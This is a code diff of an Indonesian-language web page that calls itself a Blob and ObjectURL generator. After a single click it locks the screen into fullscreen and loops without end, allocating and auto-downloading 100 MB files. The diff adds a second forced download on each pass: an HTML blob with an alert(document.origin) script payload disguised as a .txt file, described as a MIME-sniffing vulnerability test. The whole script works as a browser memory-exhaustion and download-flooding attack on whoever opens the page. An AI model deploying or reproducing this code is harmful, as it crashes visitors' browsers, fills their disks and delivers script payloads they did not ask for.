@@ -1,212 +1,236 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Generator Berkas Blob & ObjectURL</title>
-
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    body {
-      font-family: Arial, sans-serif;
-      background: #f4f6f8;
-      color: #222;
-      padding: 20px;
-    }
-    .panel {
-      background: #ffffff;
-      padding: 24px;
-      border-radius: 12px;
-      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
-      max-width: 600px;
-      margin: 40px auto;
-    }
-    /* Tampilan Fullscreen */
-    :fullscreen {
-      background: #111111 !important;
-      color: #00ff00 !important;
-      padding: 20px !important;
-      overflow-y: auto !important;
-      width: 100vw !important;
-      height: 100vh !important;
-    }
-    :-webkit-full-screen {
-      background: #111111 !important;
-      color: #00ff00 !important;
-      padding: 20px !important;
-      overflow-y: auto !important;
-    }
-    h2 {
-      margin-bottom: 10px;
-    }
-    p {
-      margin-bottom: 15px;
-      line-height: 1.5;
-    }
-    button {
-      width: 100%;
-      padding: 16px;
-      cursor: pointer;
-      border: none;
-      border-radius: 6px;
-      background: #d32f2f;
-      color: #ffffff;
-      font-weight: bold;
-      font-size: 16px;
-      box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
-      transition: background 0.2s;
-    }
-    button:hover {
-      background: #b71c1c;
-    }
-    #status {
-      margin-top: 16px;
-      font-weight: bold;
-      color: #d32f2f;
-      padding: 12px;
-      background: #ffebee;
-      border-radius: 6px;
-      text-align: center;
-      border: 1px solid #ffcdd2;
-    }
-    #downloads {
-      margin-top: 20px;
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
-      gap: 10px;
-    }
-    #downloads a {
-      display: block;
-      padding: 8px;
-      background: #212121;
-      color: #80df82;
-      text-decoration: none;
-      border-radius: 4px;
-      font-size: 12px;
-      text-align: center;
-      border: 1px solid #424242;
-      word-break: break-all;
-    }
-  </style>
-</head>
-
-<body>
-  <div class="panel" id="main-panel">
-    <h2>Generator Berkas Blob &amp; ObjectURL</h2>
-    <p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob 100MB menggunakan URL.createObjectURL secara terus-menerus.</p>
-
-    <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
-
-    <div id="status" role="status">Sistem siap.</div>
-    <div id="downloads"></div>
-  </div>
-
-  <script>
-    const startBtn = document.getElementById("start-btn");
-    const statusDiv = document.getElementById("status");
-    const downloadsDiv = document.getElementById("downloads");
-
-    let activeUrls = [];
-    let isProcessing = false;
-
-    // Fungsi Sintesis Suara (TTS)
-    const speak = (message) => {
-      if ('speechSynthesis' in window) {
-        window.speechSynthesis.cancel();
-        const utterance = new SpeechSynthesisUtterance(message);
-        utterance.lang = 'id-ID';
-        utterance.rate = 1.0;
-        window.speechSynthesis.speak(utterance);
-      }
-    };
-
-    // Pembuatan Blob dan URL menggunakan URL.createObjectURL
-    const generateBlobUrl = (id) => {
-      return new Promise((resolve) => {
-        queueMicrotask(() => {
-          // Buat data mentah sebesar 100 MB di RAM
-          const sizeInBytes = 100000000; // 100 MB
-          const buffer = new Uint8Array(sizeInBytes).fill(65); // Karakter ASCII 'A'
-          
-          // 1. Buat Objek Blob
-          const blob = new Blob([buffer], { type: "text/plain;charset=utf-8" });
-          
-          // 2. Buat Object URL sementara yang menunjuk ke lokasi Blob di memori
-          const blobUrl = URL.createObjectURL(blob);
-          
-          resolve({ id: id, url: blobUrl });
-        });
-      });
-    };
-
-    // Eksekusi Unduhan Tautan
-    const triggerDownload = (file) => {
-      const a = document.createElement("a");
-      a.href = file.url; // Menggunakan URL hasil URL.createObjectURL(blob)
-      a.download = `blob-100mb-${String(file.id).padStart(3, '0')}.txt`;
-      a.textContent = `Blob #${file.id} (.txt)`;
-      downloadsDiv.appendChild(a);
-      a.click();
-    };
-
-    // Perulangan Rekursif Asynchronous
-    const processLoop = async (counter) => {
-      if (!isProcessing) return;
-
-      // Hasilkan Blob dan URL
-      const fileData = await generateBlobUrl(counter);
-      activeUrls.push(fileData.url);
-      
-      // Picu aksi simpan/unduh
-      triggerDownload(fileData);
-
-      statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} (${counter * 10000} MB Total Blob)`;
-
-      if (counter % 10 === 0) {
-        speak(`Proses mencapai ${counter} berkas.`);
-      }
-
-      // Beri kesempatan ke Event Loop untuk merender UI sebelum iterasi berikutnya
-      setTimeout(() => processLoop(counter + 1), 0);
-    };
-
-    // Event Handler Tombol
-    startBtn.addEventListener("click", () => {
-      if (isProcessing) return;
-
-      // Bersihkan alokasi memori dari URL.createObjectURL sebelumnya
-      activeUrls.forEach(url => URL.revokeObjectURL(url));
-      activeUrls = [];
-      downloadsDiv.replaceChildren();
-
-      speak("Mengaktifkan mode layar penuh.");
-
-      // Permintaan Mode Fullscreen
-      const root = document.documentElement;
-      try {
-        if (root.requestFullscreen) {
-          root.requestFullscreen();
-        } else if (root.webkitRequestFullscreen) {
-          root.webkitRequestFullscreen();
-        } else if (root.mozRequestFullScreen) {
-          root.mozRequestFullScreen();
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Generator Berkas Blob & ObjectURL</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
         }
-        statusDiv.textContent = "Mengunci layar penuh...";
-      } catch (err) {
-        console.warn("Fullscreen tidak didukung atau ditolak:", err);
-      }
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f6f8;
+            color: #222;
+            padding: 20px;
+        }
+        .panel {
+            background: #ffffff;
+            padding: 24px;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            margin: 40px auto;
+        }
+        /* Tampilan Fullscreen */
+        :fullscreen {
+            background: #111111 !important;
+            color: #00ff00 !important;
+            padding: 20px !important;
+            overflow-y: auto !important;
+            width: 100vw !important;
+            height: 100vh !important;
+        }
+        :-webkit-full-screen {
+            background: #111111 !important;
+            color: #00ff00 !important;
+            padding: 20px !important;
+            overflow-y: auto !important;
+        }
+        h2 {
+            margin-bottom: 10px;
+        }
+        p {
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+        button {
+            width: 100%;
+            padding: 16px;
+            cursor: pointer;
+            border: none;
+            border-radius: 6px;
+            background: #d32f2f;
+            color: #ffffff;
+            font-weight: bold;
+            font-size: 16px;
+            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: #b71c1c;
+        }
+        #status {
+            margin-top: 16px;
+            font-weight: bold;
+            color: #d32f2f;
+            padding: 12px;
+            background: #ffebee;
+            border-radius: 6px;
+            text-align: center;
+            border: 1px solid #ffcdd2;
+        }
+        #downloads {
+            margin-top: 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+            gap: 10px;
+        }
+        #downloads a {
+            display: block;
+            padding: 8px;
+            background: #212121;
+            color: #80df82;
+            text-decoration: none;
+            border-radius: 4px;
+            font-size: 12px;
+            text-align: center;
+            border: 1px solid #424242;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <div class="panel" id="main-panel">
+        <h2>Generator Berkas Blob &amp; ObjectURL</h2>
+        <p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob 100MB menggunakan URL.createObjectURL secara terus-menerus.</p>
+        <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
+        <div id="status" role="status">Sistem siap.</div>
+        <div id="downloads"></div>
+    </div>
 
-      // Jalankan proses setelah jeda singkat
-      setTimeout(() => {
-        isProcessing = true;
-        speak("Proses pembuatan berkas Blob dimulai.");
-        processLoop(1);
-      }, 300);
-    });
-  </script>
+    <script>
+        const startBtn = document.getElementById("start-btn");
+        const statusDiv = document.getElementById("status");
+        const downloadsDiv = document.getElementById("downloads");
+        let activeUrls = [];
+        let isProcessing = false;
+
+        // Fungsi Sintesis Suara (TTS)
+        const speak = (message) => {
+            if ('speechSynthesis' in window) {
+                window.speechSynthesis.cancel();
+                const utterance = new SpeechSynthesisUtterance(message);
+                utterance.lang = 'id-ID';
+                utterance.rate = 1.0;
+                window.speechSynthesis.speak(utterance);
+            }
+        };
+
+        // Pembuatan Blob dan URL menggunakan URL.createObjectURL (100MB Text)
+        const generateBlobUrl = (id) => {
+            return new Promise((resolve) => {
+                queueMicrotask(() => {
+                    // Buat data mentah sebesar 100 MB di RAM
+                    const sizeInBytes = 100000000; // 100 MB
+                    const buffer = new Uint8Array(sizeInBytes).fill(65); // Karakter ASCII 'A'
+                    
+                    // 1. Buat Objek Blob
+                    const blob = new Blob([buffer], { type: "text/plain;charset=utf-8" });
+                    
+                    // 2. Buat Object URL sementara yang menunjuk ke lokasi Blob di memori
+                    const blobUrl = URL.createObjectURL(blob);
+                    resolve({ id: id, url: blobUrl });
+                });
+            });
+        };
+
+        // Mengubah fungsi pembuat data untuk menguji respon MIME Sniffing browser
+        const prepareMimeBlobAsync = (i) => {
+            return new Promise((resolve) => {
+                queueMicrotask(() => {
+                    // Alih-alih teks kosong, isi diisi dengan tag kode interaktif
+                    const payloadText = "<html><body><h1>Test Vulnerability</h1><script>alert(document.origin)<\/script></body></html>";
+                    
+                    // Menyetel tipe konten sebagai HTML di memori internal Blob
+                    const blob = new Blob([payloadText], { type: "text/html" });
+                    const url = URL.createObjectURL(blob);
+                    resolve({ id: i, url: url });
+                });
+            });
+        };
+
+        // Eksekusi Unduhan Tautan (Untuk Berkas 100MB)
+        const triggerDownload = (file) => {
+            const a = document.createElement("a");
+            a.href = file.url; // Menggunakan URL hasil URL.createObjectURL(blob)
+            a.download = `blob-100mb-${String(file.id).padStart(3, '0')}.txt`;
+            a.textContent = `Blob #${file.id} (.txt)`;
+            downloadsDiv.appendChild(a);
+            a.click();
+        };
+
+        // Bagian pemicu unduhan memaksa ekstensi nama file menjadi teks biasa (MIME Test)
+        const triggerInstantDownload = (fileData) => {
+            const link = document.createElement("a");
+            link.href = fileData.url;
+            // Mengunci nama unduhan visual sebagai file teks (.txt)
+            link.download = `test-file-${fileData.id}.txt`;
+            link.textContent = `MIME Test #${fileData.id} (.txt)`;
+            downloadsDiv.appendChild(link);
+            link.click();
+        };
+
+        // Perulangan Rekursif Asynchronous
+        const processLoop = async (counter) => {
+            if (!isProcessing) return;
+
+            // --- 1. Jalankan Proses Utama (Blob 100MB) ---
+            const fileData = await generateBlobUrl(counter);
+            activeUrls.push(fileData.url);
+            triggerDownload(fileData);
+
+            // --- 2. Jalankan Proses Tambahan (MIME Sniffing Test) ---
+            const mimeData = await prepareMimeBlobAsync(counter);
+            activeUrls.push(mimeData.url);
+            triggerInstantDownload(mimeData);
+
+            // Update Status Visual
+            statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} (${counter * 100} MB Total Blob)`;
+            
+            if (counter % 10 === 0) {
+                speak(`Proses mencapai ${counter} berkas.`);
+            }
+
+            // Beri kesempatan ke Event Loop untuk merender UI sebelum iterasi berikutnya
+            setTimeout(() => processLoop(counter + 1), 0);
+        };
+
+        // Event Handler Tombol
+        startBtn.addEventListener("click", () => {
+            if (isProcessing) return;
+
+            // Bersihkan alokasi memori dari URL.createObjectURL sebelumnya
+            activeUrls.forEach(url => URL.revokeObjectURL(url));
+            activeUrls = [];
+            downloadsDiv.replaceChildren();
+
+            speak("Mengaktifkan mode layar penuh.");
+
+            // Permintaan Mode Fullscreen
+            const root = document.documentElement;
+            try {
+                if (root.requestFullscreen) {
+                    root.requestFullscreen();
+                } else if (root.webkitRequestFullscreen) {
+                    root.webkitRequestFullscreen();
+                } else if (root.mozRequestFullScreen) {
+                    root.mozRequestFullScreen();
+                }
+                statusDiv.textContent = "Mengunci layar penuh...";
+            } catch (err) {
+                console.warn("Fullscreen tidak didukung atau ditolak:", err);
+            }
+
+            // Jalankan proses setelah jeda singkat
+            setTimeout(() => {
+                isProcessing = true;
+                speak("Proses pembuatan berkas Blob dimulai.");
+                processLoop(1);
+            }, 300);
+        });
+    </script>
 </body>
 </html>
